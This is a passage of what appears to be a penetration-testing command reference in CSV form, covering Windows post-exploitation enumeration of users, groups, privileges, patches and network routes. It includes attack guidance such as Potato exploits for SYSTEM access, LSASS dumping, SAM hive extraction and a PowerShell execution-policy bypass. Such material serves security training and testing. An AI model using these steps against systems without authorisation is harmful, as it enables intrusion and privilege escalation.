HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI""]}","[""ps-search-credentials"", ""ps-search-desktop-flags"", ""reg-query-credentials""]","","","","",""
"win-whoami-basic","Whoami - Current User and Hostname","post-exploit","whoami","Display current username and hostname. First command to run after gaining shell access - establishes identity context for all subsequent enumeration.","situational-awareness","","FIRST COMMAND after gaining Windows shell. The hostname often reveals machine purpose (WEB01 = web server, MSSQL01 = database server, CLIENTWK220 = workstation). Username format tells you if local (HOSTNAME\user) or domain account (DOMAIN\user). This single command establishes your identity context for ALL subsequent enumeration and privilege escalation decisions.

MANUAL ALTERNATIVES:

Basic whoami:
whoami
# Output: clientwk220\dave

Environment variables (if whoami blocked):
echo %USERDOMAIN%\%USERNAME%
# Output: CLIENTWK220\dave

Hostname only:
hostname
# Output: clientwk220

PowerShell alternatives:
$env:USERNAME
$env:COMPUTERNAME
$env:USERDOMAIN
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

INTERPRETING OUTPUT:

Local account format:
HOSTNAME\username
Example: CLIENTWK220\dave
# Implies: Non-domain machine OR local account on domain machine

Domain account format:
DOMAIN\username
Example: CORP\dave
# Implies: Domain-joined machine, domain credentials

HOSTNAME INFERENCE:
- WEB01, WWW, WEBSERVER = Web server (check IIS, Apache)
- SQL01, MSSQL, DB = Database server (check SQL Server, MySQL)
- DC01, DC, PDC = Domain Controller (high-value target)
- CLIENT, WORKSTATION, WK = User workstation
- FILE01, FS, NAS = File server (check shares)
- MAIL, EXCHANGE = Mail server

TIME ESTIMATE: <1 second","high","","","","{""'whoami' is not recognized"": ""PATH variable broken. Solution: Use full path C:\\Windows\\System32\\whoami.exe. Or check if shell is actually Windows (might be restricted shell or container)."", ""Access denied"": ""Highly restricted shell (AppLocker, Constrained Language Mode). Solution: Try %USERDOMAIN%\\%USERNAME% environment variables. Or echo %USERNAME% for username only."", ""Output looks wrong (shows SID instead of name)"": ""Account may be recently created or orphaned. Solution: Use whoami /user to see SID, then check if account exists with net user.""}","{""whoami"": ""Windows built-in command that displays the current user's domain\\username. On local accounts shows HOSTNAME\\username format. No flags needed for basic output. Works in both cmd.exe and PowerShell. ALWAYS run this first - establishes who you are before any enumeration.""}","","","[""win-whoami-groups"", ""win-whoami-priv""]"
"win-whoami-groups","Whoami Groups - Group Memberships and SIDs","post-exploit","whoami /groups","Display all groups the current user belongs to, including SIDs and group types. Critical for understanding current privilege level and potential escalation paths.","situational-awareness","","SECOND COMMAND after whoami basic. Group memberships determine what attacks are possible. Key groups to look for:

**HIGH-VALUE GROUPS (Immediate Privilege Escalation):**
- Administrators - Full system access
- Backup Operators - Can read/write all files (backup/restore rights)
- Server Operators - Can modify services (service hijacking)
- Account Operators - Can modify most users/groups

**ACCESS GROUPS (Lateral Movement):**
- Remote Desktop Users - RDP access available
- Remote Management Users - WinRM access available
- Distributed COM Users - DCOM lateral movement

**DOMAIN GROUPS (AD Escalation):**
- Domain Admins - Full domain control
- Enterprise Admins - Full forest control
- Schema Admins - AD schema modification
- Group Policy Creator Owners - GPO modification

**WELL-KNOWN SIDs:**
S-1-5-32-544 = Administrators
S-1-5-32-545 = Users
S-1-5-32-555 = Remote Desktop Users
S-1-5-11 = Authenticated Users
S-1-5-18 = SYSTEM

MANUAL ALTERNATIVES:

All groups with SIDs:
whoami /groups

Legacy command (shows fewer groups):
net user %USERNAME%

PowerShell:
[Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object { $_.Translate([Security.Principal.NTAccount]).Value }

INTERPRETING INTEGRITY LEVELS:
Mandatory Label\High Mandatory Level = Elevated process
Mandatory Label\Medium Mandatory Level = Standard user process
Mandatory Label\Low Mandatory Level = Sandboxed process
Mandatory Label\System Mandatory Level = SYSTEM process

TIME ESTIMATE: <1 second","high","","","","{""No Administrators group shown"": ""User is not local admin. This is expected for low-privilege users. Solution: Look for other interesting groups: Backup Operators (file access), Remote Desktop Users (RDP access), Remote Management Users (WinRM access)."", ""Domain groups not displayed"": ""Machine may not be domain-joined or current user is local account. Solution: Check systeminfo | findstr Domain to verify domain membership."", ""SIDs shown instead of names"": ""Group may be orphaned or from untrusted domain. Solution: SID S-1-5-32-544 = Administrators, S-1-5-32-545 = Users. Research SID online."", ""Output truncated"": ""Console buffer too small. Solution: whoami /groups > groups.txt && type groups.txt to save and display full output.""}","{""/groups"": ""Display all security groups current user is a member of. Shows Group Name, Type (Well-known, Alias, etc.), SID, and Attributes (Enabled, Mandatory, etc.). CRITICAL for privilege assessment - membership in Administrators, Backup Operators, Remote Desktop Users determines attack vectors. SIDs reveal whether groups are local or domain-based.""}","[""win-whoami-basic""]","","[""ps-get-localgroup"", ""ps-get-localgroupmember""]"
"win-whoami-priv","Whoami Privileges - Check Current Token Privileges","post-exploit","whoami /priv","Display all privileges assigned to current access token. Critical for identifying Potato attack vectors (SeImpersonatePrivilege) and other privilege escalation opportunities.","situational-awareness","","CRITICAL for Potato exploit detection. Check for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege - if present, Potato exploits (JuicyPotato, PrintSpoofer, RoguePotato, etc.) will likely work for SYSTEM shell.

**EXPLOITABLE PRIVILEGES (Immediate Escalation):**

SeImpersonatePrivilege - POTATO EXPLOITS
- JuicyPotato (Windows 7-10, Server 2008-2016)
- PrintSpoofer (Windows 10, Server 2019+)
- RoguePotato (All versions)
- SweetPotato (All versions)
- GodPotato (Windows 10, Server 2019+)
Typically present on: IIS, MSSQL, service accounts

SeAssignPrimaryTokenPrivilege - POTATO EXPLOITS
Same as above - enables token manipulation

SeDebugPrivilege - PROCESS INJECTION
- Dump LSASS memory
- Inject into any process
- Read process memory
Typically: Local Administrators only

SeBackupPrivilege - FILE READ
- Read any file regardless of ACL
- Extract SAM/SYSTEM hives
- Read sensitive configuration
Typically: Backup Operators group

SeRestorePrivilege - FILE WRITE
- Write any file regardless of ACL
- DLL hijacking in protected directories
- Service binary replacement
Typically: Backup Operators group

SeLoadDriverPrivilege - DRIVER LOADING
- Load malicious kernel driver
- Capcom.sys exploitation
Typically: Local Administrators only

SeTakeOwnershipPrivilege - OWNERSHIP CHANGE
- Take ownership of any object
- Then modify ACLs to gain access
Typically: Local Administrators only

**COMMON PRIVILEGE SETS:**

Standard User (limited escalation options):
- SeChangeNotifyPrivilege (bypass traverse checking)
- SeIncreaseWorkingSetPrivilege
- SeShutdownPrivilege

Service Account (Potato viable):
- All standard user privileges
+ SeImpersonatePrivilege
+ SeAssignPrimaryTokenPrivilege

Local Administrator (many options):
- All service account privileges
+ SeDebugPrivilege
+ SeBackupPrivilege
+ SeRestorePrivilege
+ SeLoadDriverPrivilege
+ SeTakeOwnershipPrivilege

SYSTEM (full privileges):
- All privileges enabled

MANUAL ALTERNATIVES:

View all privileges:
whoami /priv

Comprehensive view (user + groups + privileges):
whoami /all

PowerShell (check specific privilege):
[Security.Principal.WindowsIdentity]::GetCurrent().HasClaim('SeImpersonatePrivilege')

POTATO DECISION TREE:
1. Run whoami /priv
2. Check for SeImpersonatePrivilege = Enabled
3. If YES: Try PrintSpoofer (newest, reliable)
4. If PrintSpoofer fails: Try JuicyPotato/SweetPotato
5. If all fail: Check Windows version compatibility

TIME ESTIMATE: <1 second","high","","","","{""SeImpersonatePrivilege not shown"": ""User doesn't have impersonation rights. Normal for standard users. Solution: Only service accounts (IIS, SQL Server, etc.) typically have this. If you're in such context, privilege should be present."", ""All privileges Disabled"": ""Privileges exist but not active for this process. Solution: Some disabled privileges can be enabled with PowerShell or specific actions. Check if UAC prompt would enable them."", ""Very few privileges (3-4 only)"": ""Standard user token. This is normal. Solution: Focus on other escalation vectors (unquoted services, scheduled tasks, etc.) rather than privilege abuse."", ""Need to see all token info"": ""Use whoami /all for comprehensive view including user, groups, and privileges combined.""}","{""/priv"": ""Display all privileges in current access token with their state (Enabled/Disabled). Privileges determine what operations current process can perform. KEY PRIVILEGE: SeImpersonatePrivilege = Potato exploits viable. Other important privileges: SeDebugPrivilege (process manipulation), SeBackupPrivilege (read any file), SeRestorePrivilege (write any file), SeLoadDriverPrivilege (driver loading).""}","[""win-whoami-basic""]","","[""win-privesc-winpeas"", ""win-potato-exploits""]"
"ps-get-localuser","Get-LocalUser - List All Local Users","post-exploit","Get-LocalUser","PowerShell cmdlet to list all local user accounts on the system. Shows enabled/disabled status and account descriptions. Essential for identifying potential privilege escalation targets.","user-enumeration","","Identify ALL local users for password attacks and privilege escalation. Look for patterns:

**HIGH-VALUE USERNAME PATTERNS:**
- *admin* (daveadmin, backupadmin, adminuser)
- *backup* (backupuser, backup_svc)
- *service*, *svc* (sqlservice, svc_account)
- *test* (testadmin - often weak passwords)
- Same name with/without 'admin' suffix (dave + daveadmin)

**INTERPRETING ENABLED STATUS:**
- Administrator: False = Disabled (default on Win10+)
  Consider: Can you enable it if you get admin?
- Guest: False = Disabled (security best practice)
  If Enabled: Anonymous access possible
- Custom accounts: Should be Enabled for active users
  Disabled accounts may have unchanged old passwords

**ATTACK IMPLICATIONS:**
1. Find admin-looking usernames
2. Try password reuse (found passwords from files)
3. Try weak passwords on service accounts
4. Cross-reference with found credentials

MANUAL ALTERNATIVES:

PowerShell (modern):
Get-LocalUser
Get-LocalUser | Select-Object Name, Enabled, Description
Get-LocalUser | Where-Object { $_.Enabled -eq $true }

Legacy (all Windows versions):
net user

Detailed user info:
net user <username>

WMIC:
wmic useraccount get name,disabled

Filter for enabled accounts only:
Get-LocalUser | Where-Object Enabled | Select-Object Name

EXAMPLE OUTPUT INTERPRETATION:

Name            Enabled Description
----            ------- -----------
Administrator   False   Built-in account for administering...
BackupAdmin     True    
dave            True    dave
daveadmin       True    
Guest           False   Built-in account for guest access...
steve           True

Analysis:
- BackupAdmin: Enabled admin account - HIGH VALUE TARGET
- dave + daveadmin: Same person has both accounts
  Pattern: Low-priv dave, high-priv daveadmin
  Attack: Find dave's password, try it for daveadmin
- steve: Standard user, check group memberships

TIME ESTIMATE: <1 second","high","","","","{""'Get-LocalUser' is not recognized"": ""Windows version too old (pre-Win10/Server 2016) or module not installed. Solution: Use legacy command: net user. This works on all Windows versions."", ""Access denied"": ""Running in restricted PowerShell session. Solution: Use cmd.exe and net user command instead. Or try PowerShell bypass: powershell -ep bypass -c Get-LocalUser"", ""Empty output"": ""Very unusual - system should have at least Administrator and Guest. Solution: Check if connected to correct system. Use net user as fallback."", ""Constrained Language Mode"": ""AppLocker or WDAC restricting PowerShell. Solution: Exit to cmd.exe and use net user. Or use C# reflection techniques to bypass.""}","{""Get-LocalUser"": ""PowerShell cmdlet from LocalAccounts module (Windows 10+, Server 2016+). Lists all local user accounts with Name, Enabled status, and Description fields. Use this to identify: (1) disabled Administrator account (can sometimes be enabled), (2) service accounts that may have weak passwords, (3) admin-related usernames like 'adminuser', 'backupadmin', 'daveadmin' suggesting privileged accounts.""}","","[""win-net-user-local""]","[""ps-get-localgroup"", ""ps-get-localgroupmember""]"
"ps-get-localgroup","Get-LocalGroup - List All Local Groups","post-exploit","Get-LocalGroup","PowerShell cmdlet to list all local groups on the system. Identifies custom groups that may indicate privileged access or special permissions.","group-enumeration","","Identify ALL local groups, especially custom ones. Standard groups to always check membership for:

**CRITICAL BUILTIN GROUPS:**
- Administrators - Full system control
- Backup Operators - Read/write any file
- Remote Desktop Users - RDP access
- Remote Management Users - WinRM access
- Distributed COM Users - DCOM lateral movement
- Hyper-V Administrators - VM control

**CUSTOM GROUPS TO INVESTIGATE:**
Any non-BUILTIN group - read the description!
- adminteam, ITadmins - Likely has special access
- BackupUsers - May have file access
- helpdesk - Often has password reset rights
- developers - May have code/server access

MANUAL ALTERNATIVES:

PowerShell:
Get-LocalGroup
Get-LocalGroup | Select-Object Name, Description
Get-LocalGroup | Where-Object { $_.Name -like '*admin*' }

Legacy:
net localgroup

EXAMPLE OUTPUT INTERPRETATION:

Name                                Description
----                                -----------
Administrators                      Administrators have complete...
adminteam                           Members are admins to all workstations on second floor
Backup Operators                    Backup Operators can override...
BackupUsers                         
helpdesk                            
Remote Desktop Users                Members can log on remotely...
Remote Management Users             Members can access WMI resources...
Users                               Users are prevented from making...

Analysis:
- adminteam: Custom group with informative description
  Check members: Get-LocalGroupMember adminteam
- BackupUsers: Custom, no description
  Different from BUILTIN\Backup Operators
- helpdesk: Custom, check if has special permissions

TIME ESTIMATE: <1 second","high","","","","{""'Get-LocalGroup' is not recognized"": ""Windows version too old. Solution: Use net localgroup command (works on all Windows versions)."", ""Need more group details"": ""Get-LocalGroup only shows name and description. Solution: For members, use Get-LocalGroupMember <groupname>"", ""Custom groups not explained"": ""Description may be empty. Solution: Group name often reveals purpose. Check membership with Get-LocalGroupMember.""}","{""Get-LocalGroup"": ""PowerShell cmdlet that lists all local security groups. Shows Name and Description for each group. Look for custom groups (non-BUILTIN) that may have special permissions - descriptions often reveal purpose. Standard BUILTIN groups include Administrators, Users, Remote Desktop Users, Backup Operators.""}","","[""win-net-localgroup""]","[""ps-get-localgroupmember""]"
"ps-get-localgroupmember","Get-LocalGroupMember - List Group Members","post-exploit","Get-LocalGroupMember <GROUP>","PowerShell cmdlet to list members of a specific local group. Essential for identifying who has administrative or special access on the system.","group-enumeration","Get-LocalGroupMember Administrators","ALWAYS check Administrators group first - identifies all privileged users on system.

**CRITICAL GROUPS TO ENUMERATE:**

1. Administrators
Get-LocalGroupMember Administrators
# All local admins - primary targets

2. Remote Desktop Users
Get-LocalGroupMember 'Remote Desktop Users'
# Who can RDP - useful for credential reuse

3. Remote Management Users
Get-LocalGroupMember 'Remote Management Users'
# Who can WinRM - useful for lateral movement

4. Backup Operators
Get-LocalGroupMember 'Backup Operators'
# Can read/write any file - interesting for privesc

5. Any custom groups found
Get-LocalGroupMember <custom_group>

**INTERPRETING PRINCIPALSOURCE:**
- Local = Account created on this machine
- ActiveDirectory = Domain account
- MicrosoftAccount = Microsoft/Azure AD account

MANUAL ALTERNATIVES:

PowerShell:
Get-LocalGroupMember Administrators
Get-LocalGroupMember 'Remote Desktop Users'
Get-LocalGroupMember -Group 'Administrators' | Select-Object Name, ObjectClass

Legacy:
net localgroup Administrators
net localgroup ""Remote Desktop Users""

EXAMPLE OUTPUT INTERPRETATION:

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        CLIENTWK220\Administrator Local
User        CLIENTWK220\daveadmin     Local
User        CLIENTWK220\backupadmin   Local
User        CLIENTWK220\offsec        Local

Analysis:
- 4 local administrators found
- daveadmin, backupadmin, offsec are custom accounts
- Administrator is the built-in account
- All are Local (not domain accounts)

ATTACK IMPLICATIONS:
1. daveadmin - Likely dave's admin account
   Try: Passwords found for dave
2. backupadmin - Backup related
   Check: Backup software configs for stored creds
3. Target credentials for ANY of these 4 users
   for SYSTEM-level access

TIME ESTIMATE: <1 second per group","high","","","","{""Group not found"": ""Group name incorrect or doesn't exist. Solution: List all groups first with Get-LocalGroup to get exact names. Names are case-insensitive."", ""'Get-LocalGroupMember' not recognized"": ""Windows version too old. Solution: Use net localgroup <groupname> instead."", ""Shows SID instead of name"": ""Account may be from untrusted domain or deleted. Solution: Research the SID format or ignore (orphaned account)."", ""Group shows nested groups"": ""Windows supports group nesting. Solution: Recursively enumerate nested groups: Get-LocalGroupMember <nested_group>.""}","{""Get-LocalGroupMember"": ""PowerShell cmdlet that lists all members (users and groups) of specified local group. Shows ObjectClass (User/Group), Name, and PrincipalSource (Local/ActiveDirectory). Use to identify who has specific access - especially for Administrators, Remote Desktop Users, Remote Management Users groups.""}","[""ps-get-localgroup""]","[""win-net-localgroup-members""]","[""win-net-user-detail""]"
"win-net-user-local","Net User - List Local Users (Legacy)","post-exploit","net user","Legacy Windows command to list all local user accounts. Works on all Windows versions including pre-PowerShell systems. Alternative to Get-LocalUser.","user-enumeration","","FALLBACK when PowerShell blocked or unavailable. Works on Windows XP through Windows 11 and all Server versions.

**WHEN TO USE NET USER vs GET-LOCALUSER:**
- net user: Older systems, AppLocker/CLM environments, cmd.exe shells
- Get-LocalUser: Modern systems, need enabled/disabled status, scripting

**OUTPUT FORMAT:**

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
daveadmin                DefaultAccount           Guest
offsec                   steve
The command completed successfully.

**COMPARISON WITH GET-LOCALUSER:**
net user: Just names, works everywhere
Get-LocalUser: Name + Enabled + Description, modern systems only

MANUAL ALTERNATIVES:

Basic list:
net user

Specific user details:
net user Administrator
net user daveadmin

WMIC (more detail):
wmic useraccount get name,disabled,description

PowerShell:
Get-LocalUser

TIME ESTIMATE: <1 second","high","","","","{""Access denied"": ""User lacks permission to list accounts. Very unusual. Solution: Try in elevated prompt. Or check if system is domain controller (use net user /domain for domain users)."", ""Shows domain users instead of local"": ""Connected to domain controller. Solution: For local accounts on DC, use: wmic useraccount where domain='%COMPUTERNAME%' get name"", ""Need more details on user"": ""net user only shows names. Solution: Use net user <username> for details on specific user.""}","{""net user"": ""Built-in Windows command available since Windows NT. Lists all local user accounts in simple format. Works in cmd.exe and PowerShell on ALL Windows versions. More compatible than Get-LocalUser but provides less detail. Use when PowerShell cmdlets unavailable or in restricted shells.""}","","[""ps-get-localuser""]","[""win-net-user-detail"", ""win-net-localgroup""]"
"win-net-user-detail","Net User Detail - Specific User Information","post-exploit","net user <USERNAME>","Display detailed information about a specific local user including group memberships, password expiry, last logon, and account status.","user-enumeration","net user steve","Get detailed info on SPECIFIC users identified as interesting (admin-like names, found in config files, etc.).

**KEY FIELDS TO ANALYZE:**

Account active: Yes
- If No, account disabled but may have valid password
- Disabled accounts sometimes have unchanged old passwords

Local Group Memberships:
- Shows all groups user belongs to
- Look for: *Administrators, *Remote Desktop Users, etc.
- Asterisk (*) prefix indicates local group

Password last set:
- Very old date = password may be weak/unchanged
- Very recent = user active, password may be strong

Password expires:
- Never = Service account or admin convenience
- Date = Standard user account

Last logon:
- Recent = Active user
- Never/old = Dormant account, may have weak security

MANUAL ALTERNATIVES:

Single user:
net user steve
net user Administrator

WMIC:
wmic useraccount where name='steve' get /format:list

PowerShell:
Get-LocalUser -Name steve | Format-List *

EXAMPLE OUTPUT INTERPRETATION:

User name                    steve
Full Name                    
Comment                      
Account active               Yes
Account expires              Never
Password last set            6/16/2022 1:03:52 PM
Password expires             Never
Password changeable          6/16/2022 1:03:52 PM
Password required            Yes
User may change password     Yes
Logon hours allowed          All
Local Group Memberships      *helpdesk          *Remote Desktop Users
                             *Remote Management Use*Users
Global Group memberships     *None

Analysis:
- Account active: Yes (can be used)
- Password never expires: Convenience setting
- Local Group Memberships:
  - helpdesk: Custom group - check what access
  - Remote Desktop Users: Can RDP to this system
  - Remote Management Users: Can WinRM to this system
  - Users: Standard user group
- Not in Administrators: Not local admin
- But CAN access system remotely (RDP/WinRM)

ATTACK IMPLICATION:
If we find steve's password, we can:
1. RDP to this system
2. WinRM to this system (evil-winrm)
But NOT run as administrator (need privesc)

TIME ESTIMATE: <1 second","high","","","","{""User name not found"": ""Username doesn't exist or typo. Solution: List users first with net user to get exact names."", ""Shows domain user info"": ""Username exists in domain. Solution: Specify local user explicitly: net user <username> /domain:false (doesn't work on all versions). Better: check wmic useraccount where name='<username>' and domain='%COMPUTERNAME%' get * /format:list"", ""Access denied"": ""Rare - user lacks permission. Solution: Try from elevated prompt or use whoami /groups on target user session.""}","{""net user <USERNAME>"": ""Show detailed information for specific user. Output includes: Full name, comment, account active status, account expiration, password last set, password expiration, password changeable, logon hours, local group memberships, global group memberships (if domain). Critical for understanding user's access level and account configuration.""}","[""win-net-user-local""]","","[""ps-get-localgroupmember""]"
"win-net-localgroup","Net Localgroup - List Local Groups (Legacy)","post-exploit","net localgroup","Legacy Windows command to list all local groups on the system. Works on all Windows versions. Alternative to Get-LocalGroup.","group-enumeration","","FALLBACK when PowerShell blocked. Works everywhere.

**EXAMPLE OUTPUT:**

Aliases for \\CLIENTWK220

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*adminteam
*Backup Operators
*BackupUsers
*Cryptographic Operators
*Device Owners
*Distributed COM Users
*Event Log Readers
*Guests
*helpdesk
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Remote Desktop Users
*Remote Management Users
*Replicator
*System Managed Accounts Group
*Users
The command completed successfully.

**KEY GROUPS TO CHECK MEMBERS:**
1. Administrators - Full control
2. adminteam - Custom admin group
3. Backup Operators - File access
4. BackupUsers - Custom backup group
5. helpdesk - Custom support group
6. Remote Desktop Users - RDP access
7. Remote Management Users - WinRM access

TIME ESTIMATE: <1 second","high","","","","{""Shows domain groups"": ""Machine is a domain controller. Solution: Local groups still shown, but domain groups also appear. Focus on groups without DOMAIN\\ prefix."", ""Access denied"": ""Very unusual. Solution: Try from elevated prompt.""}","{""net localgroup"": ""Built-in Windows command that lists all local security groups. Works on ALL Windows versions from XP to 11 and all Server versions. Output shows group names prefixed with asterisk (*). Use when Get-LocalGroup unavailable due to old Windows version or PowerShell restrictions.""}","","[""ps-get-localgroup""]","[""win-net-localgroup-members""]"
"win-net-localgroup-members","Net Localgroup Members - List Group Members (Legacy)","post-exploit","net localgroup <GROUP>","Legacy Windows command to list members of a specific local group. Works on all Windows versions. Alternative to Get-LocalGroupMember.","group-enumeration","net localgroup Administrators","ALWAYS enumerate Administrators group. Use quotes for group names with spaces.

**ESSENTIAL ENUMERATIONS:**

net localgroup Administrators
net localgroup ""Remote Desktop Users""
net localgroup ""Remote Management Users""
net localgroup ""Backup Operators""

**EXAMPLE OUTPUT:**

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
backupadmin
daveadmin
offsec
The command completed successfully.

Analysis:
- 4 administrators found
- Target these accounts for password attacks

TIME ESTIMATE: <1 second per group","high","","","","{""Group name not found"": ""Typo or group doesn't exist. Solution: List groups first with net localgroup, use exact name including spaces."", ""Group has spaces in name"": ""Must quote the name. Solution: net localgroup \""Remote Desktop Users\"" or net localgroup \""Remote Management Users\"""", ""Shows SID instead of name"": ""Member account orphaned or from untrusted domain. Solution: Ignore or research SID format.""}","{""net localgroup <GROUP>"": ""Lists all members of the specified local group. Works on ALL Windows versions. Use when Get-LocalGroupMember unavailable. Group names with spaces must be quoted: net localgroup \""Remote Desktop Users\"". Shows both local and domain accounts that are members.""}","[""win-net-localgroup""]","[""ps-get-localgroupmember""]","[""win-net-user-detail""]"
"win-systeminfo-basic","Systeminfo - OS Version and System Information","post-exploit","systeminfo","Display detailed system information including OS version, build number, architecture, hotfixes, and hardware. Essential for identifying kernel exploits and understanding target environment.","situational-awareness","","CRITICAL for determining attack vectors. Parse output for key information:

**KEY FIELDS:**

OS Name: Microsoft Windows 11 Pro
OS Version: 10.0.22621 N/A Build 22621
# Build number determines exact version and patch level
# Search: ""Windows Build 22621 vulnerabilities""

System Type: x64-based PC
# CRITICAL for exploit/tool selection
# x64 = use 64-bit tools/exploits
# x86 = use 32-bit tools/exploits

Hotfix(s): X Hotfix(s) Installed.
           [01]: KB5015684
           [02]: KB5016348
# Missing hotfixes = potential vulnerabilities
# Compare against known vulnerable patch levels

**QUICK FILTERS:**

OS version only:
systeminfo | findstr /B /C:""OS Name"" /C:""OS Version""

Architecture:
systeminfo | findstr /B /C:""System Type""

Patches:
systeminfo | findstr /B /C:""Hotfix""

Domain info:
systeminfo | findstr /B /C:""Domain""

All key info:
systeminfo | findstr /i ""os name version system type domain hotfix""

**KERNEL EXPLOIT RESEARCH:**
1. Note OS version and build number
2. Search: ""Windows [version] [build] kernel exploit""
3. Check if required patches are installed
4. Cross-reference with exploit-db, GitHub

**COMMON OSCP-RELEVANT BUILDS:**
- Windows 7 SP1: Build 7601 (many kernel exploits)
- Windows 10 1607: Build 14393 (various privesc)
- Windows 10 1903: Build 18362
- Windows 11 22H2: Build 22621
- Server 2016: Build 14393
- Server 2019: Build 17763

TIME ESTIMATE: 5-30 seconds (faster with filters)","high","","","","{""Command hangs for long time"": ""Trying to contact domain controller. Solution: Run systeminfo | findstr /B /C:\""OS\"" /C:\""System Type\"" /C:\""Hotfix\"" for faster output without network queries."", ""Need specific information quickly"": ""Full systeminfo is slow. Solution: systeminfo | findstr /i \""os version\"" for OS only. Or systeminfo | findstr /i \""hotfix\"" for patches only."", ""Architecture unclear"": ""Need to know 32-bit vs 64-bit for exploits/tools. Solution: System Type line shows x64-based PC or x86-based PC.""}","{""systeminfo"": ""Built-in Windows command that displays comprehensive system information. Key fields: OS Name/Version (determines exploit compatibility), System Type (x64/x86 architecture), Hotfix(s) (missing patches = vulnerabilities), Network Card(s) (interfaces for pivoting). Works on all Windows versions. Critical for kernel exploit research and exam planning.""}","","","[""win-kernel-exploits"", ""win-privesc-winpeas""]"
"win-ipconfig-all","Ipconfig All - Network Configuration","post-exploit","ipconfig /all","Display detailed network configuration for all interfaces including IP addresses, DNS servers, DHCP status, and MAC addresses. Essential for understanding network position and pivoting opportunities.","network-enumeration","","Understand network position and identify pivoting opportunities.

**KEY FIELDS:**

Host Name: clientwk220
# Confirms hostname from whoami

Primary Dns Suffix:
# Empty = not domain-joined or local DNS
# corp.com = Domain name for AD enumeration

IPv4 Address: 192.168.50.220
# Your current IP - note for pivoting

Subnet Mask: 255.255.255.0
# /24 = 254 hosts on this subnet

Default Gateway: 192.168.50.254
# Router - may be pivot point

DHCP Enabled: No
# Manual config = likely server or important workstation
# Yes = typical workstation

DNS Servers: 8.8.8.8 or 192.168.50.1
# Internal DNS = AD environment, use for enumeration
# External DNS = May be standalone or isolated

**PIVOTING ASSESSMENT:**
1. Note all IP addresses and subnets
2. Multiple NICs = access to multiple networks
3. VPN adapters = remote network access
4. Internal DNS = domain enumeration target

**MANUAL ALTERNATIVES:**

Basic (just IP/gateway):
ipconfig

Full details:
ipconfig /all

DNS cache (reveals accessed hosts):
ipconfig /displaydns

PowerShell:
Get-NetIPConfiguration
Get-NetAdapter | Get-NetIPAddress

TIME ESTIMATE: <1 second","high","","","","{""Multiple adapters shown"": ""Normal for machines with multiple network connections. Solution: Identify main adapter (usually first Ethernet or Wi-Fi). Look for 'Connection-specific DNS Suffix' to identify domain networks."", ""DHCP Enabled: Yes but no IP"": ""DHCP failed. Solution: Adapter may be on isolated network or DHCP server down. Manual IP may be needed."", ""No DNS servers shown"": ""Static configuration without DNS. Solution: Check hosts file at C:\\Windows\\System32\\drivers\\etc\\hosts for manual entries.""}","{""/all"": ""Display full configuration for all network interfaces. Without /all, only shows IP address, subnet mask, and default gateway. With /all, additionally shows: DNS servers (useful for AD enumeration), DHCP server (indicates network infrastructure), MAC address (for ARP-based attacks), DNS suffix (reveals domain name).""}","","","[""win-route-print"", ""win-netstat-ano""]"
"win-route-print","Route Print - Routing Table","post-exploit","route print","Display the IP routing table showing network destinations and gateways. Reveals accessible networks and potential pivot points.","network-enumeration","","Identify accessible networks for pivoting and lateral movement.

**INTERPRETING OUTPUT:**

Network Destination  Netmask       Gateway       Interface
0.0.0.0              0.0.0.0       192.168.50.254 192.168.50.220
# Default route - all traffic not matching other routes goes here

192.168.50.0         255.255.255.0 On-link       192.168.50.220
# Local subnet - directly accessible hosts

10.10.0.0            255.255.0.0   192.168.50.1  192.168.50.220
# Additional network route - may indicate VPN or secondary network

**PIVOTING ASSESSMENT:**
1. Routes to non-local networks = potential pivot targets
2. Multiple gateways = multiple network paths
3. VPN routes = access to remote networks
4. Persistent routes = regularly accessed networks

**QUICK FILTERS:**

IPv4 routes only:
route print -4

Filter for specific subnet:
route print | findstr 10.10

PowerShell:
Get-NetRoute
Get-NetRoute -AddressFamily IPv4

CMD alternative (netstat routing):
netstat -rn
# Same as route print, shows routing table

TIME ESTIMATE: <1 second","medium","","","","{""Too much output"": ""IPv6 routes cluttering view. Solution: route print -4 for IPv4 only."", ""Need specific route"": ""Looking for route to specific network. Solution: route print | findstr 192.168""}","{""route print"": ""Windows command to display kernel IP routing table. Shows: Interface List (NICs), IPv4 Route Table, IPv6 Route Table. Key information: Network destinations reachable from this host, gateways used for each destination. Reveals hidden networks or VPN routes not obvious from ipconfig.""}","[""win-ipconfig-all""]","","[""win-netstat-ano""]"
"win-netstat-ano","Netstat - Active Network Connections","post-exploit","netstat -ano","Display all active TCP connections, listening ports, and associated process IDs. Essential for identifying running services, other users' connections, and potential attack vectors.","network-enumeration","","CRITICAL for understanding what's running and who's connected.

**COMMON PORTS TO INVESTIGATE:**

Port 80/443 (HTTP/HTTPS):
- Web server running
- Check for web exploits, default creds

Port 3306 (MySQL):
- Database server
- Check for default creds, config files

Port 3389 (RDP):
- Remote desktop enabled
- Shows active RDP sessions (ESTABLISHED)

Port 445 (SMB):
- File sharing enabled
- Check for open shares

Port 5985/5986 (WinRM):
- Windows Remote Management
- evil-winrm access possible

**INTERPRETING STATE:**

LISTENING - Service waiting for connections
- 0.0.0.0:PORT = listening on all interfaces
- 127.0.0.1:PORT = localhost only
- 192.168.x.x:PORT = specific interface

ESTABLISHED - Active connection
- Check Foreign Address for connected clients
- Your attack connection visible here
- Other users' RDP sessions visible

**EXAMPLE ANALYSIS:**

TCP  0.0.0.0:80        0.0.0.0:0    LISTENING   3340
# Web server on all interfaces, PID 3340

TCP  0.0.0.0:3306      0.0.0.0:0    LISTENING   3508
# MySQL on all interfaces, PID 3508

TCP  192.168.50.220:3389  192.168.48.3:33770  ESTABLISHED  1148
# Active RDP session from 192.168.48.3
# Another user connected - potential credential capture

TCP  192.168.50.220:4444  192.168.48.3:58386  ESTABLISHED  2064
# Your bind shell connection

**QUICK FILTERS:**

Listening ports only:
netstat -ano | findstr LISTENING

Established connections:
netstat -ano | findstr ESTABLISHED

Specific port:
netstat -ano | findstr :3389
netstat -ano | findstr :80

PowerShell:
Get-NetTCPConnection -State Listen
